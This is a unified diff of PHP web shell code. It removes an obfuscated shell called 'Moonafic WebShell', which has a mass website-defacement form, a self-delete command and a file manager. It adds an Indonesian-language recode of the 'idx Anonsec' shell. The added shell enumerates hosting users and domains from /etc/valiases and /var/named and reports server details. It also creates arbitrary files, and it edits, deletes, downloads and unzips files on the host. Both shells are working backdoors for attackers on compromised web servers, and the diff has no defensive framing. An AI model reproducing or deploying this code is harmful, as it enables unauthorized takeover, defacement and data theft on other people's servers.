+								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+							} else {
+								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+								foreach($domains_jump[1] as $dj) {
+									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+									$user_jumping_url = $user_jumping_url['name'];
+									if($user_jumping_url == $user_idx_jump) {
+										echo " => ( <u>$dj</u> )<br>";
+										break;
+									}
+								}
+							}
+						} else {
+							echo "<br>";
+						}
+					}
 				}
-			}	
+			}
 		}
-	echo "<br/><br/><center><div class='btn btn-primary'><a class='iofibrainwash' style='color:#ffffff;' href='?path=$path/kaliinirisu_config'>Done</a></div><center>";
-	} 
- } elseif (${$moonafic[10]}['moonatul'] == 'mass') { 
-     echo "<br/><br/><center><div style='width: 400px;'><form method='POST'>Target Folder<input class='form-control' name='base_dir' value='". $moonafic[20]() ."'>Name of File<input class='form-control' name='munarooh' value='Moonafic.htm'>Script Deface<textarea class='form-control' name='index'>Hacked by ./AkatsuChan | Moonafic WebShell</textarea><br><input class='btn btn-primary' type='submit' value='Mass !!!'></form></div></center>";
-     if (isset (${$moonafic[9]}['base_dir']))
-     {
-             if (!$moonafic[34] (${$moonafic[9]}['base_dir']))
-                     die (${$moonafic[9]}['base_dir']." Not Found !<br>");
-      
-             if (!$moonafic[40] (${$moonafic[9]}['base_dir']))
-                     die (${$moonafic[9]}['base_dir']." Is Not A Directory !<br>");
-      
-             @$moonafic[23] (${$moonafic[9]}['base_dir']) or die ("Cannot Open Directory");
-      
-             $files = (@$moonafic[28] (${$moonafic[9]}['base_dir'])) or die ("Fuck u -_- <br>");
-      
-             foreach ($files as $file):
-                     if ($file != "." && $file != ".." && @$moonafic[44] ($file) == "dir")
-                     {
-                             $index = $moonafic[20]()."/".$file."/".${$moonafic[9]}['munarooh'];
-                             if ($moonafic[18]($index, ${$moonafic[9]}['index']))
-                                     echo "<center>$index &#10003;</center></p>";
-                     }
-             endforeach;
-     }
-    } elseif (${$moonafic[10]}['moonatul'] == 'kill') { 
-        $fileini = $_SERVER['SCRIPT_FILENAME'];
-        $moonafic[24]('home');
-        $moonafic[24]('kaliinirisu_config');
-        $moonafic[25]($fileini);
-        echo '<br><br><br><center>Good Bye</center>';
-     } else 
-{
-?>
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+	}
+	
+	echo "</div>";}
+	elseif ($_REQUEST['about'] == "d7net") {
+		echo "<hr><center>About ME<br><br>";
+		echo "Recode Shell Dari idx Anonsec dan sedikit merubah tampilan<br>";
+		echo "Tanpa adanya logger, shell ini aman digunakan<br>";
+		echo "Tunggu shell versi terbarunya dari saya ";
+		echo "kunjungi website => <a class='button' href='http://www.opetmv.rf.gd/index.php?opet=backdoor' target='_blank'>Click</a></center><hr><br>";}
 
-    <div id="mgdl321">
-        <ul id="dltb321">
+	elseif ($_REQUEST['buatfile'] == "d7net") {
+		echo "<center>
+    <form method='POST'>
+        <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
+        <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
+        <button type='sumbit' class='button' name='bikin'>Bikin!!</button><br><br/>
+    </form></center>";
 
-            <li><a href="#tab1"><i class="fa fa-list" aria-hidden="true"></i> File Manager</a></li>
-            <li><a href="#tab2"><i class="fa fa-info" aria-hidden="true"></i> Server Info</a></li>
+    if (isset($_POST['bikin'])) {
+        $nama_file = $_POST['nama_file'];
+        $isi_file = $_POST['isi_file'];
+        $handle = fopen("$nama_file", 'w');
 
-        </ul>
-        <div id="dlctn321">
-            <div id="tab1">
-
-                <?php
-if (isset(${$moonafic[10]}['filesrc'])) {
-    echo "<b style='color:#BF8DF2;'>Current File : </b>";
-    echo ${$moonafic[10]}['filesrc'];
-    echo '<br/><br/>';
-    echo ('<div class="form-group"><textarea readonly="readonly" class="form-control" id="exampleFormControlTextarea1" rows="3">' . $moonafic[37]($moonafic[6](${$moonafic[10]}['filesrc'])) . '</textarea></div>');
-} elseif (isset(${$moonafic[10]}['option']) && ${$moonafic[9]}['opt'] != 'delete') {
-    echo '<b style="color:#BF8DF2;">Current File : </b>' . ${$moonafic[9]}['path'] . '<br /><br />';
-    if (${$moonafic[9]}['opt'] == 'chmod') {
-        if (isset(${$moonafic[9]}['perm'])) {
-            if ($moonafic[7](${$moonafic[9]}['path'], ${$moonafic[9]}['perm'])) {
-                echo '<div class="alert alert-success" role="alert">Change Permission Done.</div>';
-            } else {
-                echo '<div class="alert alert-danger" role="alert">Change Permission Error.</div>';
-            }
-        }
-        echo '<form method="POST"><input class="form-control" name="perm" type="text" size="4" value="' . $moonafic[38]($moonafic[39]('%o', fileperms(${$moonafic[9]}['path'])), -4) . '" /><input class="form-control" type="hidden" name="path" value="' . ${$moonafic[9]}['path'] . '"><input class="form-control" type="hidden" name="opt" value="chmod"><br/><input class="btn btn-primary" type="submit" value="Submit" /></form>';
-    } elseif (${$moonafic[9]}['opt'] == 'rename') {
-        if (isset(${$moonafic[9]}['newname'])) {
-            if ($moonafic[36](${$moonafic[9]}['path'], $path . '/' . ${$moonafic[9]}['newname'])) {
-                echo '<div class="alert alert-success" role="alert">Change Name Done.</div>';
-            } else {
-                echo '<div class="alert alert-danger" role="alert">Change Name Error.</div>';
-            }
-            ${$moonafic[9]}['name'] = ${$moonafic[9]}['newname'];
-        }
-        echo '<form method="POST"><input class="form-control" name="newname" type="text" size="20" value="' . ${$moonafic[9]}['name'] . '" /><input class="form-control" type="hidden" name="path" value="' . ${$moonafic[9]}['path'] . '"><input class="form-control" type="hidden" name="opt" value="rename"><br/><input class="btn btn-primary" type="submit" value="Submit" /></form>';
-    } elseif (${$moonafic[9]}['opt'] == 'edit') {
-        if (isset(${$moonafic[9]}['src'])) {
-            $fp = $moonafic[27](${$moonafic[9]}['path'], 'w');
-            if ($moonafic[35]($fp, ${$moonafic[9]}['src'])) {
-                echo '<div class="alert alert-success" role="alert">Edit File Done.</div>';
-            } else {
-                echo '<div class="alert alert-danger" role="alert">Edit File Error.</div>';
-            }
-            $moonafic[46]($fp);
-        }
-        echo '<form method="POST"><textarea class="form-control" cols=80 rows=20 name="src">' . $moonafic[37]($moonafic[6](${$moonafic[9]}['path'])) . '</textarea><br /><input class="form-control" type="hidden" name="path" value="' . ${$moonafic[9]}['path'] . '"><input class="form-control" type="hidden" name="opt" value="edit"><br/><input class="btn btn-primary" type="submit" value="Submit" /></form>';
-    }
-} else {
-    echo '<center>';
-    if (isset(${$moonafic[10]}['option']) && ${$moonafic[9]}['opt'] == 'delete') {
-        if (${$moonafic[9]}['type'] == 'dir') {
-            if ($moonafic[24](${$moonafic[9]}['path'])) {
-                echo '<b><div class="alert alert-success" role="alert">Delete Dir Done.</div></b>';
-            } else {
-                echo '<b><div class="alert alert-danger" role="alert">Delete Dir Error.</div></b>';
-            }
-        } elseif (${$moonafic[9]}['type'] == 'file') {
-            if ($moonafic[25](${$moonafic[9]}['path'])) {
-                echo '<b><div class="alert alert-success" role="alert">Delete File Done.</div></b>';
-            } else {
-                echo '<b><div class="alert alert-danger" role="alert">Delete File Error.</div></b>';
-            }
-        }
-    }
-    echo '</center>';
-    $scandir = (@$moonafic[28]($path));
-    echo '<div id="content"><table class="table" align="center"><tr class="first"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td></tr>';
-    foreach ($scandir as $dir) {
-        if (!$moonafic[40]("$path/$dir") || $dir == '.' || $dir == '..')
-            continue;
-        echo "<tr><td><a class='iofibrainwash' href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
-        if ($moonafic[29]("$path/$dir"))
-            echo '<font style="color:green;">';
-        elseif (!$moonafic[30]("$path/$dir"))
-            echo '<font style="color:red;">';
-        echo perms("$path/$dir");
-        if ($moonafic[29]("$path/$dir") || !$moonafic[30]("$path/$dir"))
-            echo '</font>';
-        
-        echo '</center></td><td><center><form method="POST" action="?option&path='. $path .'"><select onchange="this.form.submit();" name="opt"><option value=""></option><option value="delete">Delete</option><option value="chmod">Chmod</option><option value="rename">Rename</option></select><input type="hidden" name="type" value="dir"><input type="hidden" name="name" value="'. $dir .'"><input type="hidden" name="path" value="'. $path .'/'. $dir .'"></form></center></td></tr>';
-    }
-    foreach ($scandir as $file) {
-        if (!$moonafic[42]("$path/$file"))
-            continue;
-        $size = $moonafic[41]("$path/$file") / 1024;
-        $size = $moonafic[43]($size, 3);
-        if ($size >= 1024) {
-            $size = $moonafic[43]($size / 1024, 2) . ' MB';
+        if (fwrite($handle, $isi_file)) {
+            echo '<center>File Berhasil dibuat !!&nbsp;<font color="gold"><i>'.$nama_file.'</i></font><br><br></center>';
         } else {
-            $size = $size . ' KB';
+            echo '<script>alert("File Gagal Dibuat");</script>';
         }
-        
-        echo "<tr><td><a class='iofibrainwash' href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
-        if ($moonafic[29]("$path/$file"))
-            echo '<font style="color:green;">';
-        elseif (!$moonafic[30]("$path/$file"))
-            echo '<font style="color:red;">';
-        echo perms("$path/$file");
-        if ($moonafic[29]("$path/$file") || !$moonafic[30]("$path/$file"))
-            echo '</font>';
-        echo '</center></td><td><center><form method="POST" action="?option&path='. $path .'"><select onchange="this.form.submit();" name="opt"><option value=""></option><option value="delete">Delete</option><option value="chmod">Chmod</option><option value="rename">Rename</option><option value="edit">Edit</option></select><input type="hidden" name="type" value="file"><input type="hidden" name="name" value="'. $file .'"><input type="hidden" name="path" value="'. $path .'/'. $file .'"></form></center></td></tr>';
     }
-    echo '</table></div>';
 }
-?>
-            </div>
-            <div id="tab2">
-                <pre>
-<b style='color:#BF8DF2;'>User             : </b><?php echo $moonafic[2](); ?><br/>
-<b style='color:#BF8DF2;'>Group            : </b><?php echo $moonafic[3](); ?><br/>
-<b style='color:#BF8DF2;'>Server IP        : </b><?php echo (@$moonafic[16]($_SERVER['HTTP_HOST'])); ?><br/>
-<b style='color:#BF8DF2;'>User IP          : </b><?php echo $_SERVER['REMOTE_ADDR']; ?><br/>
-<b style='color:#BF8DF2;'>Safe Mode        : </b><?php echo $sm; ?><br/>
-<b style='color:#BF8DF2;'>Disable Function : </b><?php echo $ds; ?><br/>
-<b style='color:#BF8DF2;'>Software         : </b><?php echo $_SERVER['SERVER_SOFTWARE']; ?><br/>
-<b style='color:#BF8DF2;'>System           : </b><?php echo $moonafic[1](); ?>
-                </pre>
-            </div>
-        </div>
-    </div>
-    <?php } ?>
-    <div style="border: 3px dotted #BF8DF2;" class="static">
-        <font><?php echo $moonafic[8]; ?>&nbsp;<font color="#BF8DF2"><i class="fa fa-code"></i></font>
-            <?php echo $moonafic[12];?>&nbsp;<a href="https://reiz.my.id/Moonafic/"><?php echo $moonafic[13]; ?></a>
-        </font>
-    </div>
-    <script type='text/javascript' src="https://reiz.my.id/Moonafic/src/js/jquery.min.js"></script>
-    <script type='text/javascript' src="https://reiz.my.id/Moonafic/src/js/particles.min.js"></script>
-    <script type='text/javascript'>
-        $(".iofibrainwash").click(function (t) {
-            t.preventDefault();
-            var e = $(this).attr("href");
-            history.pushState("", "", e), $.get(e, function (t) {
-                $("body").html(t)
-            })
-        });
-    </script>
-    <script type='text/javascript'>
-        jQuery(document).ready(function ($) {
-            $('#dltb321 li:first').addClass('active');
-            $('#dlctn321 > div').hide();
-            $('#dlctn321 > div:first').show();
-            $('#dltb321 a').click(function () {
-                $('#dltb321 li').removeClass('active');
-                $(this).parent().addClass('active');
-                var activeTab = $(this).attr('href');
-                $('#dlctn321 > div:visible').hide();
-                $(activeTab).show();
-                return false;
-            });
-        });
-    </script>
-</body>
+elseif ($_REQUEST['info'] == "d7net") {
+	echo "<br><hr>";
+	echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
+	echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
+	echo "System : <font color='gold'>".php_uname()."</font><br>";
+	echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
+	echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
+	echo "Disable Function : ".$disf."</font><br>";
+	echo "MySQL : ";
+	echo "<hr><br>";}
 
+
+if (!is_readable($lokasi)) {
+    die("<center>This directory is unreadable :(</center>");
+}
+
+echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Last Modified</center></td>
+<td><center>Owner</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>';
+
+foreach($lokasinya as $dir){
+    if(!is_dir($lokasi."/".$dir) || $dir == '.') continue;
+    echo "<tr>
+    <td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
+    <td><center>--</center></td>
+    <td><center>".filedate($lokasi."/".$dir)."</center></td>
+    <td>".owner($lokasi."/".$dir)."</td>
+    <td><center>";
+    if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
+    elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
+    echo statusnya($lokasi."/".$dir);
+    if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
+
+    echo "</center></td>
+    <td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
+    <select name=\"pilih\">
+    <option value=\"\"></option>
+    <option value=\"hapus\">Delete</option>
+    <option value=\"gantinama\">Rename</option>
+    </select>
+    <input type=\"hidden\" name=\"type\" value=\"dir\">
+    <input type=\"hidden\" name=\"name\" value=\"$dir\">
+    <input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
+    <input type=\"submit\" class=\"gas\" value=\">\" />
+    </form></center></td>
+    </tr>";
+}
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
+foreach($lokasinya as $file) {
+    if(!is_file("$lokasi/$file")) continue;
+    $size = filesize("$lokasi/$file")/1024;
+    $size = round($size,3);
+    if($size >= 1024){
+    $size = round($size/1024,2).' MB';
+} else {
+    $size = $size.' KB';
+}
+
+echo "<tr>
+<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>".filedate($lokasi."/".$file)."</center></td>
+<td>".owner($lokasi."/".$file)."</td>
+<td><center>";
+if(is_writable("$lokasi/$file")) echo '<font color="green">';
+elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
+echo statusnya("$lokasi/$file");
+if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
+echo "</center></td><td><center>
+<form method=\"post\" action=\"?pilihan&path=$lokasi\">
+<select name=\"pilih\">table
+<option value=\"\">-Select-</option>
+<option value=\"hapus\">Delete</option>
+<option value=\"dunlut\">Download</option>
+<option value=\"gantinama\">Rename</option>
+<option value=\"edit\">Edit</option>";
+if (class_exists("ZipArchive")) {
+    echo "<option value=\"unzip\">Unzip</option>";
+}
+echo "</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
+<input type=\"submit\" class=\"gas\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '</tr></td></table></table>';
+author();
+
+function statusnya($file){
+$izin = substr(sprintf('%o', fileperms($file)), -4);
+return $izin;
+}
+?>	
+</body>
 </html>
